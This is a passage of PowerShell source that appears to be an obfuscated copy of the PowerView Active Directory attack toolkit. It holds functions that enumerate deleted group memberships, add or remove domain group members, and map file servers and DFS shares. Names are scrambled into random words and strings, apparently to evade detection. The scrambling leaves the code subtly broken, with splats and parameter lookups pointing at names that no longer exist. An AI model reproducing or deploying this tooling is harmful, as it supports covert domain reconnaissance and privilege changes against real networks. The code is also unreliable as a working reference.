        $Raw
    )

    BEGIN {
        $tHAcROQOWB9HdRG = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
            'LDAPFilter'    =   '(objectCategory=group)'
        }
        if ($PSBoundParameters['Domain']) { $tHAcROQOWB9HdRG['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['LDAPFilter']) { $tHAcROQOWB9HdRG['LDAPFilter'] = $RmrzVOkRggEzAyC }
        if ($PSBoundParameters['SearchBase']) { $tHAcROQOWB9HdRG['SearchBase'] = $KZiNDyuCPTYnSy9 }
        if ($PSBoundParameters['Server']) { $tHAcROQOWB9HdRG['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $tHAcROQOWB9HdRG['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $tHAcROQOWB9HdRG['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $tHAcROQOWB9HdRG['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $tHAcROQOWB9HdRG['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $tHAcROQOWB9HdRG['Credential'] = $szvFVWkPJummdcf }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $tHAcROQOWB9HdRG['Identity'] = $MhNmgElNMTxhWpJ }

        ensnared @SearcherArguments | ForEach-Object {
            $Lt9fBFA9A9LHslT = $_.Properties['distinguishedname'][0]
            ForEach($icEQTRxInMbojFy in $_.Properties['msds-replvaluemetadata']) {
                $sLFDcxShvHxipvz = [xml]$icEQTRxInMbojFy | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($sLFDcxShvHxipvz) {
                    if (($sLFDcxShvHxipvz.pszAttributeName -Match 'member') -and (($sLFDcxShvHxipvz.dwVersion % 2) -eq 0 )) {
                        $MCqE9JDSKKFQghW = New-Object PSObject
                        $MCqE9JDSKKFQghW | Add-Member NoteProperty 'GroupDN' $Lt9fBFA9A9LHslT
                        $MCqE9JDSKKFQghW | Add-Member NoteProperty 'MemberDN' $sLFDcxShvHxipvz.pszObjectDn
                        $MCqE9JDSKKFQghW | Add-Member NoteProperty 'TimeFirstAdded' $sLFDcxShvHxipvz.ftimeCreated
                        $MCqE9JDSKKFQghW | Add-Member NoteProperty 'TimeDeleted' $sLFDcxShvHxipvz.ftimeDeleted
                        $MCqE9JDSKKFQghW | Add-Member NoteProperty 'LastOriginatingChange' $sLFDcxShvHxipvz.ftimeLastOriginatingChange
                        $MCqE9JDSKKFQghW | Add-Member NoteProperty 'TimesAdded' ($sLFDcxShvHxipvz.dwVersion / 2)
                        $MCqE9JDSKKFQghW | Add-Member NoteProperty 'LastOriginatingDsaDN' $sLFDcxShvHxipvz.pszLastOriginatingDsaDN
                        $MCqE9JDSKKFQghW.PSObject.TypeNames.Insert(0, 'PowerView.DomainGroupMemberDeleted')
                        $MCqE9JDSKKFQghW
                    }
                }
                else {
                    Write-Verbose "[idiomatic] Error retrieving 'msds-replvaluemetadata' for '$Lt9fBFA9A9LHslT'"
                }
            }
        }
    }
}


function prevaricates {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $MhNmgElNMTxhWpJ,

        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $sDYnzWrKftKJNli,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $DiFXM9AnKByvDqk = @{
            'Identity' = $MhNmgElNMTxhWpJ
        }
        if ($PSBoundParameters['Domain']) { $DiFXM9AnKByvDqk['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['Credential']) { $DiFXM9AnKByvDqk['Credential'] = $szvFVWkPJummdcf }

        $BCemknDAiqQb9ky = Gautama @ContextArguments

        if ($BCemknDAiqQb9ky) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($BCemknDAiqQb9ky.Context, $BCemknDAiqQb9ky.Identity)
            }
            catch {
                Write-Warning "[prevaricates] Error finding the group identity '$MhNmgElNMTxhWpJ' : $_"
            }
        }
    }

    PROCESS {
        if ($Group) {
            ForEach ($9mLdlSJRwrOuSuV in $sDYnzWrKftKJNli) {
                if ($9mLdlSJRwrOuSuV -match '.+\\.+') {
                    $DiFXM9AnKByvDqk['Identity'] = $9mLdlSJRwrOuSuV
                    $9pIhbvQtcJm9vTV = Gautama @ContextArguments
                    if ($9pIhbvQtcJm9vTV) {
                        $PgzXxHGVDkWW9LL = $9pIhbvQtcJm9vTV.Identity
                    }
                }
                else {
                    $9pIhbvQtcJm9vTV = $BCemknDAiqQb9ky
                    $PgzXxHGVDkWW9LL = $9mLdlSJRwrOuSuV
                }
                Write-Verbose "[prevaricates] Adding member '$9mLdlSJRwrOuSuV' to group '$MhNmgElNMTxhWpJ'"
                $9mLdlSJRwrOuSuV = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($9pIhbvQtcJm9vTV.Context, $PgzXxHGVDkWW9LL)
                $Group.Members.Add($9mLdlSJRwrOuSuV)
                $Group.Save()
            }
        }
    }
}


function information {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $MhNmgElNMTxhWpJ,

        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $sDYnzWrKftKJNli,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $DiFXM9AnKByvDqk = @{
            'Identity' = $MhNmgElNMTxhWpJ
        }
        if ($PSBoundParameters['Domain']) { $DiFXM9AnKByvDqk['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['Credential']) { $DiFXM9AnKByvDqk['Credential'] = $szvFVWkPJummdcf }

        $BCemknDAiqQb9ky = Gautama @ContextArguments

        if ($BCemknDAiqQb9ky) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($BCemknDAiqQb9ky.Context, $BCemknDAiqQb9ky.Identity)
            }
            catch {
                Write-Warning "[information] Error finding the group identity '$MhNmgElNMTxhWpJ' : $_"
            }
        }
    }

    PROCESS {
        if ($Group) {
            ForEach ($9mLdlSJRwrOuSuV in $sDYnzWrKftKJNli) {
                if ($9mLdlSJRwrOuSuV -match '.+\\.+') {
                    $DiFXM9AnKByvDqk['Identity'] = $9mLdlSJRwrOuSuV
                    $9pIhbvQtcJm9vTV = Gautama @ContextArguments
                    if ($9pIhbvQtcJm9vTV) {
                        $PgzXxHGVDkWW9LL = $9pIhbvQtcJm9vTV.Identity
                    }
                }
                else {
                    $9pIhbvQtcJm9vTV = $BCemknDAiqQb9ky
                    $PgzXxHGVDkWW9LL = $9mLdlSJRwrOuSuV
                }
                Write-Verbose "[information] Removing member '$9mLdlSJRwrOuSuV' from group '$MhNmgElNMTxhWpJ'"
                $9mLdlSJRwrOuSuV = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($9pIhbvQtcJm9vTV.Context, $PgzXxHGVDkWW9LL)
                $Group.Members.Remove($9mLdlSJRwrOuSuV)
                $Group.Save()
            }
        }
    }
}


function peels {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RmrzVOkRggEzAyC,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        function ratify {

            Param([String]$Path)

            if ($Path -and ($Path.split('\\').Count -ge 3)) {
                $Temp = $Path.split('\\')[2]
                if ($Temp -and ($Temp -ne '')) {
                    $Temp
                }
            }
        }

        $tHAcROQOWB9HdRG = @{
            'LDAPFilter' = '(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(homedirectory=*)(scriptpath=*)(profilepath=*)))'
            'Properties' = 'homedirectory,scriptpath,profilepath'
        }
        if ($PSBoundParameters['SearchBase']) { $tHAcROQOWB9HdRG['SearchBase'] = $KZiNDyuCPTYnSy9 }
        if ($PSBoundParameters['Server']) { $tHAcROQOWB9HdRG['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $tHAcROQOWB9HdRG['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $tHAcROQOWB9HdRG['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $tHAcROQOWB9HdRG['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $tHAcROQOWB9HdRG['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $tHAcROQOWB9HdRG['Credential'] = $szvFVWkPJummdcf }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            ForEach ($rT9EZJuWEfY9rVY in $pkMxgDCVHqOym9m) {
                $tHAcROQOWB9HdRG['Domain'] = $rT9EZJuWEfY9rVY
                $gmNSnJICOeviaXn = cackles @SearcherArguments

                $(ForEach($p99MOm9jJGQCDpU in $gmNSnJICOeviaXn.FindAll()) {if ($p99MOm9jJGQCDpU.Properties['homedirectory']) {ratify($p99MOm9jJGQCDpU.Properties['homedirectory'])}if ($p99MOm9jJGQCDpU.Properties['scriptpath']) {ratify($p99MOm9jJGQCDpU.Properties['scriptpath'])}if ($p99MOm9jJGQCDpU.Properties['profilepath']) {ratify($p99MOm9jJGQCDpU.Properties['profilepath'])}}) | Sort-Object -Unique
            }
        }
        else {
            $gmNSnJICOeviaXn = cackles @SearcherArguments
            $(ForEach($p99MOm9jJGQCDpU in $gmNSnJICOeviaXn.FindAll()) {if ($p99MOm9jJGQCDpU.Properties['homedirectory']) {ratify($p99MOm9jJGQCDpU.Properties['homedirectory'])}if ($p99MOm9jJGQCDpU.Properties['scriptpath']) {ratify($p99MOm9jJGQCDpU.Properties['scriptpath'])}if ($p99MOm9jJGQCDpU.Properties['profilepath']) {ratify($p99MOm9jJGQCDpU.Properties['profilepath'])}}) | Sort-Object -Unique
        }
    }
}


function footsteps {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        $FKzJmtqtfPzCnjo = 'All'
    )

    BEGIN {
        $tHAcROQOWB9HdRG = @{}
        if ($PSBoundParameters['SearchBase']) { $tHAcROQOWB9HdRG['SearchBase'] = $KZiNDyuCPTYnSy9 }
        if ($PSBoundParameters['Server']) { $tHAcROQOWB9HdRG['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $tHAcROQOWB9HdRG['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $tHAcROQOWB9HdRG['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $tHAcROQOWB9HdRG['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $tHAcROQOWB9HdRG['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $tHAcROQOWB9HdRG['Credential'] = $szvFVWkPJummdcf }

        function callipered {
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Pkt
            )

            $bin = $Pkt
            $pGKbkcGFQBQpU9E = [bitconverter]::ToUInt32($bin[0..3],0)
            $Cv9GnWeBlzsRsgd = [bitconverter]::ToUInt32($bin[4..7],0)
            $IQJFgwWwdtqcTml = 8

            $juforEXi9DvqaZA = @()
            for($i=1; $i -le $Cv9GnWeBlzsRsgd; $i++){
                $inEgVxSAoR9vrjk = $IQJFgwWwdtqcTml
                $ecazFxinxAFxbfv = $IQJFgwWwdtqcTml + 1
                $kVe9vur9BPnqAWH = [bitconverter]::ToUInt16($bin[$inEgVxSAoR9vrjk..$ecazFxinxAFxbfv],0)

                $kLuNMfPlMgjbWqn = $ecazFxinxAFxbfv + 1
                $bbn99wWNrBeYJom = $kLuNMfPlMgjbWqn + $kVe9vur9BPnqAWH - 1
                $xOqvf9JwiveqREN = [System.Text.Encoding]::Unicode.GetString($bin[$kLuNMfPlMgjbWqn..$bbn99wWNrBeYJom])

                $av9KXnOKzluTWFx = $bbn99wWNrBeYJom + 1
                $psyxMwOnuwZZvAM = $av9KXnOKzluTWFx + 3
                $g9GnLktNuezufRi = [bitconverter]::ToUInt32($bin[$av9KXnOKzluTWFx..$psyxMwOnuwZZvAM],0)

                $JiNdMgANnjUJWyO = $psyxMwOnuwZZvAM + 1
                $9HUdxMdHQHbWVmJ = $JiNdMgANnjUJWyO + $g9GnLktNuezufRi - 1
                $YDSWNsQwv9LLVoD = $bin[$JiNdMgANnjUJWyO..$9HUdxMdHQHbWVmJ]
                switch -wildcard ($xOqvf9JwiveqREN) {
                    "\siteroot" {  }
                    "\domainroot*" {


                        $NrrIn9qSCSAnfUq = 0
                        $9FHRZDF9AG99wgG = 15
                        $rrdsmMsYFoybmTL = [byte[]]$YDSWNsQwv9LLVoD[$NrrIn9qSCSAnfUq..$9FHRZDF9AG99wgG]
                        $guid = New-Object Guid(,$rrdsmMsYFoybmTL) # should match $J9GFmiusCmhMXAS
                        $wswwataZmyxxiqK = $9FHRZDF9AG99wgG + 1
                        $yTXghkoYAxheOnG = $wswwataZmyxxiqK + 1
                        $cngdmbnA9bYGDml = [bitconverter]::ToUInt16($YDSWNsQwv9LLVoD[$wswwataZmyxxiqK..$yTXghkoYAxheOnG],0)
                        $jAATlLfcAfOsqwE = $yTXghkoYAxheOnG + 1
                        $NzNIKSZbd9NffX9 = $jAATlLfcAfOsqwE + $cngdmbnA9bYGDml - 1
                        $9TESRVuD9FM9NbH = [System.Text.Encoding]::Unicode.GetString($YDSWNsQwv9LLVoD[$jAATlLfcAfOsqwE..$NzNIKSZbd9NffX9])

                        $MkclpIHNeCMKnAR = $NzNIKSZbd9NffX9 + 1
                        $nFaJZLImoQAjwc9 = $MkclpIHNeCMKnAR + 1
                        $9drsMqCHzFyuSaa = [bitconverter]::ToUInt16($YDSWNsQwv9LLVoD[$MkclpIHNeCMKnAR..$nFaJZLImoQAjwc9],0)
                        $yklEooXLGxJpEmD = $nFaJZLImoQAjwc9 + 1
                        $p9tutspRSbGuTkn = $yklEooXLGxJpEmD + $9drsMqCHzFyuSaa - 1
                        $ctcJvMCVFaLYfFN = [System.Text.Encoding]::Unicode.GetString($YDSWNsQwv9LLVoD[$yklEooXLGxJpEmD..$p9tutspRSbGuTkn])

                        $cZqCqjmtWSJLSBL = $p9tutspRSbGuTkn + 1
                        $xmjQqOqiS9T99pI = $cZqCqjmtWSJLSBL + 3
                        $type = [bitconverter]::ToUInt32($YDSWNsQwv9LLVoD[$cZqCqjmtWSJLSBL..$xmjQqOqiS9T99pI],0)

                        $teZJsVzgvO9YbHv = $xmjQqOqiS9T99pI + 1
                        $kyWwPlWxP9kXCix = $teZJsVzgvO9YbHv + 3
                        $state = [bitconverter]::ToUInt32($YDSWNsQwv9LLVoD[$teZJsVzgvO9YbHv..$kyWwPlWxP9kXCix],0)

                        $stDXvoksAmjFnqM = $kyWwPlWxP9kXCix + 1
                        $OxRduGXjkrsZCdh = $stDXvoksAmjFnqM + 1
                        $vb9iUHSAVqpnppB = [bitconverter]::ToUInt16($YDSWNsQwv9LLVoD[$stDXvoksAmjFnqM..$OxRduGXjkrsZCdh],0)
                        $OYga9W9ElxJFRcZ = $OxRduGXjkrsZCdh + 1
                        $WgnyE9uMareODgR = $OYga9W9ElxJFRcZ + $vb9iUHSAVqpnppB - 1
                        if ($vb9iUHSAVqpnppB -gt 0)  {
                            $mvPUeXHmQ99eNoc = [System.Text.Encoding]::Unicode.GetString($YDSWNsQwv9LLVoD[$OYga9W9ElxJFRcZ..$WgnyE9uMareODgR])
                        }
                        $AtFajvyGOu9Usbt = $WgnyE9uMareODgR + 1
                        $YLK9lQiWN9tNFCE = $AtFajvyGOu9Usbt + 7

                        $oGYoaRRErDdvQCv = $YDSWNsQwv9LLVoD[$AtFajvyGOu9Usbt..$YLK9lQiWN9tNFCE] #dword lowDateTime #dword highdatetime
                        $9rZwZSvO9OVgLlA = $YLK9lQiWN9tNFCE + 1
                        $QrNZeX9Rp9PRwud = $9rZwZSvO9OVgLlA + 7
                        $QdCbUbrfEREpAcC = $YDSWNsQwv9LLVoD[$9rZwZSvO9OVgLlA..$QrNZeX9Rp9PRwud]
                        $KQLisV9FdFebUFk = $QrNZeX9Rp9PRwud + 1
                        $VHaw9QDysnzWvZE = $KQLisV9FdFebUFk + 7
                        $yGqeKCPxGdUWBO9 = $YDSWNsQwv9LLVoD[$KQLisV9FdFebUFk..$VHaw9QDysnzWvZE]
                        $9gawP9TJpeMR9uX = $VHaw9QDysnzWvZE  + 1
                        $SEiMlDn9qwXDmhZ = $9gawP9TJpeMR9uX + 3
                        $FKzJmtqtfPzCnjo = [bitconverter]::ToUInt32($YDSWNsQwv9LLVoD[$9gawP9TJpeMR9uX..$SEiMlDn9qwXDmhZ],0)


                        $rAg9VtZEXMOgqWK = $SEiMlDn9qwXDmhZ + 1
                        $CXRcgWi9RWcnKgV = $rAg9VtZEXMOgqWK + 3
                        $Vr9iUcLxMJCaaNX = [bitconverter]::ToUInt32($YDSWNsQwv9LLVoD[$rAg9VtZEXMOgqWK..$CXRcgWi9RWcnKgV],0)

                        $lmmEsWhokZlm9R9 = $CXRcgWi9RWcnKgV + 1
                        $iVc99aRnQ9QhwwB = $lmmEsWhokZlm9R9 + $Vr9iUcLxMJCaaNX - 1
                        $OKmT9dyliZFDOpO = $YDSWNsQwv9LLVoD[$lmmEsWhokZlm9R9..$iVc99aRnQ9QhwwB]
                        $VjANkYGOkHJCpxP = $iVc99aRnQ9QhwwB + 1
                        $UZFVWsYD9l9xDqC = $VjANkYGOkHJCpxP + 3
                        $wjaqSOkinrPAi9v = [bitconverter]::ToUInt32($YDSWNsQwv9LLVoD[$VjANkYGOkHJCpxP..$UZFVWsYD9l9xDqC],0)

                        $naZtxqtZSYO9xNq = $UZFVWsYD9l9xDqC + 1
                        $kgbapBPmGphQcpG = $naZtxqtZSYO9xNq + $wjaqSOkinrPAi9v - 1
                        $Mfxqq9qbTflnohj = $YDSWNsQwv9LLVoD[$naZtxqtZSYO9xNq..$kgbapBPmGphQcpG]
                        $roDPlBiXtZbBFkv = $kgbapBPmGphQcpG + 1
                        $yuqMquTZVLopo9L = $roDPlBiXtZbBFkv + 3
                        $azxCDvVFwMFOeyB = [bitconverter]::ToUInt32($YDSWNsQwv9LLVoD[$roDPlBiXtZbBFkv..$yuqMquTZVLopo9L],0)


                        $VrlQIHOJUt9tLfI = 0
                        $WMxPBboSlrzuKCv = $VrlQIHOJUt9tLfI + 3
                        $9rcfCzuMeDeZSzN = [bitconverter]::ToUInt32($OKmT9dyliZFDOpO[$VrlQIHOJUt9tLfI..$WMxPBboSlrzuKCv],0)
                        $SXGsXmNpnFXF9St = $WMxPBboSlrzuKCv + 1

                        for($j=1; $j -le $9rcfCzuMeDeZSzN; $j++){
                            $xde9MwqOqLnQUEJ = $SXGsXmNpnFXF9St
                            $zcAkiLqinjpnx9G = $xde9MwqOqLnQUEJ + 3
                            $VOG9fkelwzhnivE = [bitconverter]::ToUInt32($OKmT9dyliZFDOpO[$xde9MwqOqLnQUEJ..$zcAkiLqinjpnx9G],0)
                            $KauHcMbzkKMWNPi = $zcAkiLqinjpnx9G + 1
                            $uaQrg9IA9MmdCN9 = $KauHcMbzkKMWNPi + 7

                            $LyQh9phSpzzGuOs = $OKmT9dyliZFDOpO[$KauHcMbzkKMWNPi..$uaQrg9IA9MmdCN9]
                            $uVzVwJjUHsDbaHY = $uaQrg9IA9MmdCN9 + 1
                            $WKyQmEHEpVNGKU9 = $uVzVwJjUHsDbaHY + 3
                            $DNgodFLqOnHXZkV = [bitconverter]::ToUInt32($OKmT9dyliZFDOpO[$uVzVwJjUHsDbaHY..$WKyQmEHEpVNGKU9],0)

                            $xH9nVMFDxAFKrqU = $WKyQmEHEpVNGKU9 + 1
                            $jEbxFcqrz9nO9EV = $xH9nVMFDxAFKrqU + 3
                            $rE9AAQhXS9m9QHV = [bitconverter]::ToUInt32($OKmT9dyliZFDOpO[$xH9nVMFDxAFKrqU..$jEbxFcqrz9nO9EV],0)

                            $BxXpdacaoOuyWoj = $jEbxFcqrz9nO9EV + 1
                            $cNZbEugAp9sH9JR = $BxXpdacaoOuyWoj + 1
                            $BQ9SZZJs9uYLVnZ = [bitconverter]::ToUInt16($OKmT9dyliZFDOpO[$BxXpdacaoOuyWoj..$cNZbEugAp9sH9JR],0)

                            $9imsCuphrjsJrhK = $cNZbEugAp9sH9JR + 1
                            $WofnnxZXsOQoDUO = $9imsCuphrjsJrhK + $BQ9SZZJs9uYLVnZ - 1
                            $RvjiGqnNYeXkMog = [System.Text.Encoding]::Unicode.GetString($OKmT9dyliZFDOpO[$9imsCuphrjsJrhK..$WofnnxZXsOQoDUO])

                            $A9amQmhrfYUTBs9 = $WofnnxZXsOQoDUO + 1
                            $WhQyUUPs9hhgqzs = $A9amQmhrfYUTBs9 + 1
                            $rGttF9qmBvD9WTX = [bitconverter]::ToUInt16($OKmT9dyliZFDOpO[$A9amQmhrfYUTBs9..$WhQyUUPs9hhgqzs],0)
                            $fhDSenvAugWZXvU = $WhQyUUPs9hhgqzs + 1
                            $cvMxkms9fYlNpli = $fhDSenvAugWZXvU + $rGttF9qmBvD9WTX - 1
                            $E9ClxcBCjxN9KOf = [System.Text.Encoding]::Unicode.GetString($OKmT9dyliZFDOpO[$fhDSenvAugWZXvU..$cvMxkms9fYlNpli])

                            $OEEeZGoiVQ9b9du += "\\$RvjiGqnNYeXkMog\$E9ClxcBCjxN9KOf"
                            $SXGsXmNpnFXF9St = $cvMxkms9fYlNpli + 1
                        }
                    }
                }
                $IQJFgwWwdtqcTml = $9HUdxMdHQHbWVmJ + 1
                $AyjfRWFuPtGigVk = @{
                    'Name' = $xOqvf9JwiveqREN
                    'Prefix' = $9TESRVuD9FM9NbH
                    'TargetList' = $OEEeZGoiVQ9b9du
                }
                $juforEXi9DvqaZA += New-Object -TypeName PSObject -Property $AyjfRWFuPtGigVk
                $9TESRVuD9FM9NbH = $Null
                $xOqvf9JwiveqREN = $Null
                $OEEeZGoiVQ9b9du = $Null
            }

            $9TGCwUYhWLHOso9 = @()
            $juforEXi9DvqaZA | ForEach-Object {
                if ($_.TargetList) {
                    $_.TargetList | ForEach-Object {
                        $9TGCwUYhWLHOso9 += $_.split('\')[2]
                    }
                }
            }

            $9TGCwUYhWLHOso9
        }

        function cols {
            [CmdletBinding()]
            Param(
                [String]
                $pkMxgDCVHqOym9m,

                [String]
                $KZiNDyuCPTYnSy9,

                [String]
                $vzBgfX9wPWmbsYZ,

                [String]
                $HWlMnJozs9zEkRJ = 'Subtree',

                [Int]
                $hHyMPLAr9azKKcQ = 200,

                [Int]
                $kzlBjIuOb9n9uyj,

                [Switch]
                $gPSKVqwcbkEyaoZ,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
            )

            $pj9LyKfSxNWPSfD = cackles @PSBoundParameters

            if ($pj9LyKfSxNWPSfD) {
                $vomCtqTwVJKTDHm = @()
                $pj9LyKfSxNWPSfD.filter = '(&(objectClass=fTDfs))'

                try {
                    $xSLNEIXByfNTAdG = $pj9LyKfSxNWPSfD.FindAll()
                    $xSLNEIXByfNTAdG | Where-Object {$_} | ForEach-Object {
                        $wDpWXLYTGZrAWN9 = $_.Properties
                        $f9ATvomCutBmCTI = $wDpWXLYTGZrAWN9.remoteservername
                        $Pkt = $wDpWXLYTGZrAWN9.pkt

                        $vomCtqTwVJKTDHm += $f9ATvomCutBmCTI | ForEach-Object {
                            try {
                                if ( $_.Contains('\') ) {
                                    New-Object -TypeName PSObject -Property @{'Name'=$wDpWXLYTGZrAWN9.name[0];'RemoteServerName'=$_.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[footsteps] cols error in parsing DFS share : $_"
                            }
                        }
                    }
                    if ($xSLNEIXByfNTAdG) {
                        try { $xSLNEIXByfNTAdG.dispose() }
                        catch {
                            Write-Verbose "[footsteps] cols error disposing of the Results object: $_"
                        }
                    }
                    $pj9LyKfSxNWPSfD.dispose()

                    if ($pkt -and $pkt[0]) {
                        callipered $pkt[0] | ForEach-Object {



                            if ($_ -ne 'null') {
                                New-Object -TypeName PSObject -Property @{'Name'=$wDpWXLYTGZrAWN9.name[0];'RemoteServerName'=$_}
                            }
                        }
                    }
                }
                catch {
                    Write-Warning "[footsteps] cols error : $_"
                }
                $vomCtqTwVJKTDHm | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }

        function bunt {
            [CmdletBinding()]
            Param(
                [String]
                $pkMxgDCVHqOym9m,

                [String]
                $KZiNDyuCPTYnSy9,

                [String]
                $vzBgfX9wPWmbsYZ,

                [String]
                $HWlMnJozs9zEkRJ = 'Subtree',

                [Int]
                $hHyMPLAr9azKKcQ = 200,

                [Int]
                $kzlBjIuOb9n9uyj,

                [Switch]
                $gPSKVqwcbkEyaoZ,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
            )

            $pj9LyKfSxNWPSfD = cackles @PSBoundParameters

            if ($pj9LyKfSxNWPSfD) {
                $vomCtqTwVJKTDHm = @()
                $pj9LyKfSxNWPSfD.filter = '(&(objectClass=msDFS-Linkv2))'
                $Null = $pj9LyKfSxNWPSfD.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))

                try {
                    $xSLNEIXByfNTAdG = $pj9LyKfSxNWPSfD.FindAll()
                    $xSLNEIXByfNTAdG | Where-Object {$_} | ForEach-Object {
                        $wDpWXLYTGZrAWN9 = $_.Properties
                        $OEEeZGoiVQ9b9du = $wDpWXLYTGZrAWN9.'msdfs-targetlistv2'[0]
                        $xml = [xml][System.Text.Encoding]::Unicode.GetString($OEEeZGoiVQ9b9du[2..($OEEeZGoiVQ9b9du.Length-1)])
                        $vomCtqTwVJKTDHm += $xml.targets.ChildNodes | ForEach-Object {
                            try {
                                $cFDvvadWOUxIumb = $_.InnerText
                                if ( $cFDvvadWOUxIumb.Contains('\') ) {
                                    $MVFzdlcPaNvnu99 = $cFDvvadWOUxIumb.split('\')[3]
                                    $sTefHRNADQwPSnD = $wDpWXLYTGZrAWN9.'msdfs-linkpathv2'[0]
